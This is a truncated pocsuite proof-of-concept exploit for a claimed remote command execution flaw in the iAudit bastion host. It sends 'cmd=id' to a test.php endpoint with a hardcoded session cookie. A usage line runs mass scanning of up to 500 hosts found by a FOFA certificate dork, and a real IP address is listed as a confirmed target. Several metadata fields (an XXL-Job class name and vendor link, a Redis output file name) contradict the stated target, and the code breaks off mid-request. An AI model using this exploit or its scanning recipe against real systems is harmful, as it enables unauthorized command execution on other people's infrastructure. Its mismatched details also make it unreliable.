...
class XXLJOBPOC(POCBase):
    ...
    name = "中远麒麟iAudit堡垒机"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "中远麒麟iAudit堡垒机远程命令执行漏洞"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["https://52.199.47.175"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                攻击者可以执行任意命令
            """  # 漏洞简要描述
    pocDesc = """
    pocsuite -r ./pocs/rce.py   --dork-fofa cert.subject=\"Baolei\"  --max-size 500 --save-file ./redis_res.txt --threads 50
            """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        aurl = f"{self.url}/test.php?cmd=id"
        cookies = {"PHPSESSID": "59bc0cd1628b8e5e103a14efd9e5f09a"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)Gecko/20100101Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding":"gzip,deflate","Referer":"https://52.199.47.175/", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest":"document", "Sec-Fetch-Mode":"navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
        try:
            response = requests.get(aurl, headers=headers, cookies=cookies, verify=False, timeout=5)
